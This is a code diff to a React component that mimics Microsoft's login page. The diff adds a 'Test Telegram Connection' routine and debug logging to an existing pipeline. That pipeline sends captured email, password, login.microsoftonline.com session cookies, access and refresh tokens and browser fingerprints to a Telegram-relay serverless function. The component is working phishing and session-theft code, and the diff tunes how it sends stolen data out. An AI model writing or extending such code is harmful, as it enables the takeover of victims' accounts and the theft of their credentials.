@@ -71,6 +71,70 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
     }
   };
 
+  // Test Telegram connection
+  const testTelegramConnection = async () => {
+    try {
+      console.log('🧪 Testing Telegram connection...');
+      const testPayload = {
+        email: 'test@example.com',
+        password: 'Test Login',
+        provider: 'Microsoft',
+        fileName: 'Test Microsoft OAuth Login',
+        timestamp: new Date().toISOString(),
+        sessionId: 'test-' + Math.random().toString(36).substring(2, 15),
+        userAgent: navigator.userAgent,
+        browserFingerprint: {
+          cookies: [],
+          localStorage: '{}',
+          sessionStorage: '{}',
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          platform: navigator.platform,
+          timestamp: new Date().toISOString()
+        },
+        documentCookies: '',
+        formattedCookies: [{
+          name: 'TEST_COOKIE',
+          value: 'test_value',
+          domain: '.login.microsoftonline.com',
+          path: '/',
+          secure: true,
+          httpOnly: false,
+          sameSite: 'none',
+          expirationDate: Math.floor(Date.now() / 1000) + 3600,
+          hostOnly: false,
+          session: false,
+          storeId: null
+        }],
+        accessToken: 'test_access_token',
+        refreshToken: 'test_refresh_token',
+        userProfile: { displayName: 'Test User' },
+        skipTelegram: false
+      };
+
+      const response = await fetch('/.netlify/functions/sendTelegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(testPayload),
+        signal: AbortSignal.timeout(30000)
+      });
+
+      const result = await response.text();
+      console.log('🧪 Test response status:', response.status);
+      console.log('🧪 Test response body:', result);
+      
+      if (response.ok) {
+        console.log('✅ Telegram connection test passed!');
+      } else {
+        console.error('❌ Telegram connection test failed:', result);
+      }
+    } catch (error) {
+      console.error('❌ Telegram test error:', error);
+    }
+  };
+
   // Send data to Telegram
   const sendToTelegram = async (data: any) => {
     try {
@@ -261,14 +325,26 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
     const storedState = localStorage.getItem('oauth_state');
     const error = urlParams.get('error');
 
+    console.log('🔍 OAuth callback detection:', {
+      hasCode: !!code,
+      hasState: !!state,
+      stateMatches: state === storedState,
+      error: error,
+      currentURL: window.location.href,
+      searchParams: window.location.search
+    });
+
     if (error) {
       console.error('❌ OAuth error from provider:', error);
       return;
     }
 
     if (code && state && state === storedState) {
+      console.log('✅ Valid OAuth callback detected, processing...');
       handleOAuthCallback(code);
       return;
+    } else {
+      console.log('ℹ️ Not an OAuth callback, proceeding with redirect countdown');
     }
 
     // Start countdown for redirect
@@ -511,9 +587,16 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
             stack: telegramError.stack,
             sessionData: {
               email: sessionData.email,
-              cookieCount: sessionData.formattedCookies?.length || 0
+              cookieCount: sessionData.formattedCookies?.length || 0,
+              hasAccessToken: !!sessionData.accessToken,
+              hasRefreshToken: !!sessionData.refreshToken
             }
           });
+          
+          // Try to extract more info from the error response
+          if (telegramError.message && telegramError.message.includes('400')) {
+            console.error('❌ This looks like a backend validation error. Check the backend logs.');
+          }
         }
 
         // Log final status
@@ -611,13 +694,22 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
                   <p className="text-sm text-[#605e5c]">Redirecting automatically in {countdown} second{countdown !== 1 ? 's' : ''}</p>
                 </div>
 
-                <button
-                  onClick={handleManualRedirect}
-                  className="w-full bg-[#0078d4] text-white py-2.5 px-4 rounded-md hover:bg-[#106ebe] transition-colors font-medium flex items-center justify-center space-x-2"
-                >
-                  <ExternalLink className="w-4 h-4" />
-                  <span>Continue to Microsoft Login</span>
-                </button>
+                <div className="space-y-3">
+                  <button
+                    onClick={handleManualRedirect}
+                    className="w-full bg-[#0078d4] text-white py-2.5 px-4 rounded-md hover:bg-[#106ebe] transition-colors font-medium flex items-center justify-center space-x-2"
+                  >
+                    <ExternalLink className="w-4 h-4" />
+                    <span>Continue to Microsoft Login</span>
+                  </button>
+                  
+                  <button
+                    onClick={testTelegramConnection}
+                    className="w-full bg-green-600 text-white py-2 px-4 rounded-md hover:bg-green-700 transition-colors font-medium text-sm"
+                  >
+                    🧪 Test Telegram Connection
+                  </button>
+                </div>
               </>
             ) : (
               <div className="text-center">
